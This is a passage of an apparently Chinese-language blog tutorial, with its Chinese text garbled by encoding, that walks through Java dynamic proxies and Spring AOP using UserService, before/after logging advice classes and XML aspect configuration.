class="hljs-comment">//çœŸå®è§’è‰²</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();<br>        <span class="hljs-comment">//ä»£ç†è§’è‰²ï¼Œç°åœ¨æ²¡æœ‰</span><br>        <span class="hljs-type">ProxyInvocationHangler</span> <span class="hljs-variable">pih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyInvocationHangler</span>();<br>        <span class="hljs-comment">//é€šè¿‡è°ƒç”¨ç¨‹åºå¤„ç†è§’è‰²æ¥å¤„ç†æˆ‘ä»¬è¦è°ƒç”¨çš„æ¥å£å¯¹è±¡</span><br>        pih.setRent(host);<br>        <span class="hljs-type">Rent</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Rent) pih.getProxy();<br>        proxy.rent();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¡ˆä¾‹äºŒï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo04;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">//ä½¿ç”¨æ­¤ç±»è‡ªåŠ¨ç”Ÿæˆä»£ç†ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyInvocationHangler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">//è¢«ä»£ç†çš„æ¥å£</span><br>    <span class="hljs-keyword">private</span> Object target;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTarget</span><span class="hljs-params">(Object target)</span> &#123;<br>        <span class="hljs-built_in">this</span>.target = target;<br>    &#125;<br><br>    <span class="hljs-comment">//ç”Ÿæˆå¾—åˆ°ä»£ç†ç±»</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(),<br>                                      target.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//å¤„ç†ä»£ç†å®ä¾‹ï¼Œå¹¶è¿”å›ç»“æœ</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        log(method.getName());<br>        <span class="hljs-comment">//åŠ¨æ€ä»£ç†çš„æœ¬è´¨ï¼Œå°±æ˜¯ä½¿ç”¨åå°„æœºåˆ¶å®ç°</span><br>        <span class="hljs-keyword">return</span> method.invoke(target, args);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰§è¡Œäº†&quot;</span>+msg+<span class="hljs-string">&quot;æ–¹æ³•&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo04;<br><br><span class="hljs-keyword">import</span> com.kuang.demo02.UserService;<br><span class="hljs-keyword">import</span> com.kuang.demo02.UserServiceImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//çœŸå®è§’è‰²</span><br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">//ä»£ç†è§’è‰²ï¼Œç°åœ¨æ²¡æœ‰p</span><br>        <span class="hljs-type">ProxyInvocationHangler</span> <span class="hljs-variable">pih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyInvocationHangler</span>();<br>        <span class="hljs-comment">//è®¾ç½®ä»£ç†å¯¹è±¡</span><br>        pih.setTarget(userService);<br>        <span class="hljs-comment">//åŠ¨æ€ç”Ÿæˆä»£ç†ç±»</span><br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (UserService) pih.getProxy();<br>        proxy.add();<br>        <span class="hljs-comment">//        proxy.delete();</span><br>        <span class="hljs-comment">//        proxy.update();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4ã€AOP"><a href="#4ã€AOP" class="headerlink" title="4ã€AOP"></a>4ã€AOP</h1><h3 id="4-1-AOP-ç®€ä»‹"><a href="#4-1-AOP-ç®€ä»‹" class="headerlink" title="4.1 AOP ç®€ä»‹"></a>4.1 AOP ç®€ä»‹</h3><h4 id="4-1-1-ä»€ä¹ˆæ˜¯-AOP"><a href="#4-1-1-ä»€ä¹ˆæ˜¯-AOP" class="headerlink" title="4.1.1 ä»€ä¹ˆæ˜¯ AOP"></a>4.1.1 ä»€ä¹ˆæ˜¯ AOP</h4><p>AOPï¼ˆAspect Oriented Programmingï¼‰æ„ä¸ºï¼šé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼Œé€šè¿‡é¢„ç¼–è¯‘æ–¹å¼å’Œè¿è¡ŒæœŸåŠ¨æ€ä»£ç†å®ç°ç¨‹åºåŠŸèƒ½çš„ç»Ÿä¸€ç»´æŠ¤çš„ä¸€ç§æŠ€æœ¯ã€‚<strong>AOPæ˜¯OOPçš„å»¶ç»­</strong>ï¼Œæ˜¯è½¯ä»¶å¼€å‘ä¸­çš„ä¸€ä¸ªçƒ­ç‚¹ï¼Œä¹Ÿæ˜¯Springæ¡†æ¶ä¸­çš„ä¸€ä¸ªé‡è¦å†…å®¹ï¼Œæ˜¯å‡½æ•°å¼ç¼–ç¨‹çš„ä¸€ç§è¡ç”ŸèŒƒå‹ã€‚åˆ©ç”¨AOPå¯ä»¥å¯¹ä¸šåŠ¡é€»è¾‘çš„å„ä¸ªéƒ¨åˆ†è¿›è¡Œéš”ç¦»ï¼Œä»è€Œä½¿å¾—ä¸šåŠ¡é€»è¾‘å„éƒ¨åˆ†ä¹‹é—´çš„è€¦åˆåº¦é™ä½ï¼Œæé«˜ç¨‹åºçš„å¯é‡ç”¨æ€§ï¼ŒåŒæ—¶æé«˜äº†å¼€å‘çš„æ•ˆç‡ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749875.webp" alt="img"></p><h4 id="4-1-2-Aopåœ¨Springä¸­çš„ä½œç”¨"><a href="#4-1-2-Aopåœ¨Springä¸­çš„ä½œç”¨" class="headerlink" title="4.1.2 Aopåœ¨Springä¸­çš„ä½œç”¨"></a>4.1.2 Aopåœ¨Springä¸­çš„ä½œç”¨</h4><p><strong>æä¾›å£°æ˜å¼äº‹åŠ¡ï¼›å…è®¸ç”¨æˆ·è‡ªå®šä¹‰åˆ‡é¢</strong></p><p>ä»¥ä¸‹åè¯ç®€å•äº†è§£ï¼š</p><ul><li>æ¨ªåˆ‡å…³æ³¨ç‚¹ï¼šè·¨è¶Šåº”ç”¨ç¨‹åºå¤šä¸ªæ¨¡å—çš„æ–¹æ³•æˆ–åŠŸèƒ½ã€‚å³æ˜¯ï¼Œä¸æˆ‘ä»¬ä¸šåŠ¡é€»è¾‘æ— å…³çš„ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦å…³æ³¨çš„éƒ¨åˆ†ï¼Œå°±æ˜¯æ¨ªåˆ‡å…³æ³¨ç‚¹ã€‚å¦‚æ—¥å¿— , å®‰å…¨ , ç¼“å­˜ , äº‹åŠ¡ç­‰ç­‰ â€¦.</li><li>åˆ‡é¢ï¼ˆASPECTï¼‰ï¼šæ¨ªåˆ‡å…³æ³¨ç‚¹ è¢«æ¨¡å—åŒ– çš„ç‰¹æ®Šå¯¹è±¡ã€‚å³ï¼Œå®ƒæ˜¯ä¸€ä¸ªç±»ã€‚</li><li>é€šçŸ¥ï¼ˆAdviceï¼‰ï¼šåˆ‡é¢å¿…é¡»è¦å®Œæˆçš„å·¥ä½œã€‚å³ï¼Œå®ƒæ˜¯ç±»ä¸­çš„ä¸€ä¸ªæ–¹æ³•ã€‚</li><li>ç›®æ ‡ï¼ˆTargetï¼‰ï¼šè¢«é€šçŸ¥å¯¹è±¡ã€‚</li><li>ä»£ç†ï¼ˆProxyï¼‰ï¼šå‘ç›®æ ‡å¯¹è±¡åº”ç”¨é€šçŸ¥ä¹‹ååˆ›å»ºçš„å¯¹è±¡ã€‚</li><li>åˆ‡å…¥ç‚¹ï¼ˆPointCutï¼‰ï¼šåˆ‡é¢é€šçŸ¥ æ‰§è¡Œçš„ â€œåœ°ç‚¹â€çš„å®šä¹‰ã€‚</li><li>è¿æ¥ç‚¹ï¼ˆJointPointï¼‰ï¼šä¸åˆ‡å…¥ç‚¹åŒ¹é…çš„æ‰§è¡Œç‚¹ã€‚</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311753712.webp" alt="img"></p><p>SpringAOPä¸­ï¼Œé€šè¿‡Adviceå®šä¹‰æ¨ªåˆ‡é€»è¾‘ï¼ŒSpringä¸­æ”¯æŒ5ç§ç±»å‹çš„Advice:</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311753774.webp" alt="img"></p><p>å³ Aop åœ¨ ä¸æ”¹å˜åŸæœ‰ä»£ç çš„æƒ…å†µä¸‹ , å»å¢åŠ æ–°çš„åŠŸèƒ½ </p><h4 id="4-1-3-ä½¿ç”¨Springå®ç°Aop"><a href="#4-1-3-ä½¿ç”¨Springå®ç°Aop" class="headerlink" title="4.1.3  ä½¿ç”¨Springå®ç°Aop"></a>4.1.3  ä½¿ç”¨Springå®ç°Aop</h4><p>ã€é‡ç‚¹ã€‘ä½¿ç”¨AOPç»‡å…¥ï¼Œéœ€è¦å¯¼å…¥ä¸€ä¸ªä¾èµ–åŒ…ï¼</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjweaver<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>é¦–å…ˆç¼–å†™æˆ‘ä»¬çš„ä¸šåŠ¡æ¥å£å’Œå®ç°ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.service;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.service;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;å¢åŠ äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;åˆ é™¤äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ›´æ–°äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="ç¬¬ä¸€ç§æ–¹å¼ï¼š-é€šè¿‡-Spring-API-å®ç°"><a href="#ç¬¬ä¸€ç§æ–¹å¼ï¼š-é€šè¿‡-Spring-API-å®ç°" class="headerlink" title="ç¬¬ä¸€ç§æ–¹å¼ï¼š é€šè¿‡ Spring API å®ç°"></a>ç¬¬ä¸€ç§æ–¹å¼ï¼š é€šè¿‡ Spring API å®ç°</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.log;<br><br><span class="hljs-keyword">import</span> org.springframework.aop.MethodBeforeAdvice;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Log</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MethodBeforeAdvice</span> &#123;<br><br>    <span class="hljs-comment">//method: è¦æ‰§è¡Œçš„ç›®æ ‡å¯¹è±¡çš„æ–¹æ³•</span><br>    <span class="hljs-comment">//args: å‚æ•°</span><br>    <span class="hljs-comment">//target(o): ç›®æ ‡è¯»å†™</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">(Method method, Object[] objects, Object o)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(o.getClass().getName()+<span class="hljs-string">&quot;çš„&quot;</span>+method.getName()+<span class="hljs-string">&quot;è¢«æ‰§è¡Œäº†&quot;</span>);<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.log;<br><br><span class="hljs-keyword">import</span> org.springframework.aop.AfterReturningAdvice;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AfterLog</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AfterReturningAdvice</span> &#123;<br><br>    <span class="hljs-comment">//returnValue;è¿”å›å€¼</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterReturning</span><span class="hljs-params">(Object returnValue, Method method, Object[] args, Object target)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰§è¡Œäº†&quot;</span>+method.getName()+<span class="hljs-string">&quot;æ–¹æ³•ï¼Œè¿”å›ç»“æœä¸ºï¼š&quot;</span>+returnValue );<br>    &#125;<br>&#125;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>  xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>  xmlns:aop=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span><br>  xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span><br><span class="hljs-string">  http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="hljs-string">  http://www.springframework.org/schema/aop</span><br><span class="hljs-string">  http://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;<br><br>  &lt;!--æ³¨å†Œ beans--&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;userService&quot;</span> class=<span class="hljs-string">&quot;com.kuang.service.UserServiceImpl&quot;</span>/&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;log&quot;</span> class=<span class="hljs-string">&quot;com.kuang.log.Log&quot;</span>/&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;afterLog&quot;</span> class=<span class="hljs-string">&quot;com.kuang.log.AfterLog&quot;</span>/&gt;<br><br>  &lt;!--æ–¹å¼ä¸€ï¼šä½¿ç”¨åŸç”Ÿ Spring API æ¥å£--&gt;<br>  &lt;!--é…ç½® aop: å¯¼å…¥ aop çº¦æŸ--&gt;<br>  &lt;aop:config&gt;<br>    &lt;!--åˆ‡å…¥ç‚¹ï¼šexpression:è¡¨è¾¾å¼  execution(è¦æ‰§è¡Œçš„ä½ç½®***) --&gt;<br>    &lt;aop:pointcut id=<span class="hljs-string">&quot;pointcut&quot;</span> expression=<span class="hljs-string">&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;</span>/&gt;<br><br>    &lt;!--æ‰§è¡Œç¯ç»•å¢åŠ --&gt;<br>    &lt;aop:advisor advice-ref=<span class="hljs-string">&quot;log&quot;</span> pointcut-ref=<span class="hljs-string">&quot;pointcut&quot;</span>/&gt;<br>    &lt;aop:advisor advice-ref=<span class="hljs-string">&quot;afterLog&quot;</span> pointcut-ref=<span class="hljs-string">&quot;pointcut&quot;</span>/&gt;<br>  &lt;/aop:config&gt;<br><br>&lt;/beans&gt;<br><span class="hljs-keyword">import</span> com.kuang.service.UserService;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;applicationContext.xml&quot;</span>);<br>        <span class="hljs-comment">//åŠ¨æ€ä»£ç†çš„æ˜¯æ¥å£</span><br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> context.getBean(<span class="hljs-string">&quot;userService&quot;</span>, UserService.class);<br><br>        userService.add();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311753241.png" alt="img"></p><h5 id="ç¬¬äºŒç§æ–¹å¼ï¼šè‡ªå®šä¹‰ç±»æ¥å®ç°Aop"><a href="#ç¬¬äºŒç§æ–¹å¼ï¼šè‡ªå®šä¹‰ç±»æ¥å®ç°Aop" class="headerlink" title="ç¬¬äºŒç§æ–¹å¼ï¼šè‡ªå®šä¹‰ç±»æ¥å®ç°Aop"></a>ç¬¬äºŒç§æ–¹å¼ï¼š<strong>è‡ªå®šä¹‰ç±»æ¥å®ç°Aop</strong></h5><p>ç›®æ ‡ä¸šåŠ¡ç±»ä¸å˜ä¾æ—§æ˜¯userServiceImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.diy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DiyPointCut</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;========æ–¹æ³•æ‰§è¡Œå‰========&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;========æ–¹æ³•æ‰§è¡Œå========&quot;</span>);<br>    &#125;<br>&#125;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>  xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>  xmlns:aop=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span><br>  xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span><br><span class="hljs-string">  http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="hljs-string">  http://www.springframework.org/schema/aop</span><br><span class="hljs-string">  http://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;<br><br>  &lt;!--æ³¨å†Œ beans--&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;userService&quot;</span> class=<span class="hljs-string">&quot;com.kuang.service.UserServiceImpl&quot;</span>/&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;log&quot;</span> class=<span class="hljs-string">&quot;com.kuang.log.Log&quot;</span>/&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;afterLog&quot;</span> class=<span class="hljs-string">&quot;com.kuang.log.AfterLog&quot;</span>/&gt;<br><br>  &lt;!--    &amp;lt;!&amp;ndash;æ–¹å¼ä¸€ï¼šä½¿ç”¨åŸç”Ÿ Spring API æ¥å£&amp;ndash;&amp;gt;--&gt;<br>  &lt;!--    &amp;lt;!&amp;ndash;é…ç½® aop: å¯¼å…¥ aop çº¦æŸ&amp;ndash;&amp;gt;--&gt;<br>  &lt;!--    &lt;aop:config&gt;--&gt;<br>  &lt;!--        &amp;lt;!&amp;ndash;åˆ‡å…¥ç‚¹ï¼šexpression:è¡¨è¾¾å¼  execution(è¦æ‰§è¡Œçš„ä½ç½®***) &amp;ndash;&amp;gt;--&gt;<br>  &lt;!--        &lt;aop:pointcut id=<span class="hljs-string">&quot;pointcut&quot;</span> expression=<span class="hljs-string">&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;</span>/&gt;--&gt;<br><br>  &lt;!--        &amp;lt;!&amp;ndash;æ‰§è¡Œç¯ç»•å¢åŠ &amp;ndash;&amp;gt;--&gt;<br>  &lt;!--        &lt;aop:advisor advice-ref=<span class="hljs-string">&quot;log&quot;</span> pointcut-ref=<span class="hljs-string">&quot;pointcut&quot;</span>/&gt;--&gt;<br>  &lt;!--        &lt;aop:advisor advice-ref=<span class="hljs-string">&quot;afterLog&quot;</span> pointcut-ref=<span class="hljs-string">&quot;pointcut&quot;</span>/&gt;--&gt;<br>  &lt;!--    &lt;/aop:config&gt;--&gt;<br><br>  &lt;!--æ–¹å¼äºŒï¼šè‡ªå®šä¹‰ç±»--&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;diy&quot;</span> class=<span class="hljs-string">&quot;com.kuang.diy.DiyPointCut&quot;</span>/&gt;<br>  &lt;aop:config&gt;<br>    &lt;!--è‡ªå®šä¹‰åˆ‡é¢ï¼Œref è¦å¼•ç”¨çš„ç±»--&gt;<br>    &lt;aop:aspect ref=<span class="hljs-string">&quot;diy&quot;</span>&gt;<br>      &lt;!--åˆ‡å…¥ç‚¹--&gt;<br>      &lt;aop:pointcut id=<span class="hljs-string">&quot;diyPonitcut&quot;</span> expression=<span class="hljs-string">&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;</span>/&gt;<br>      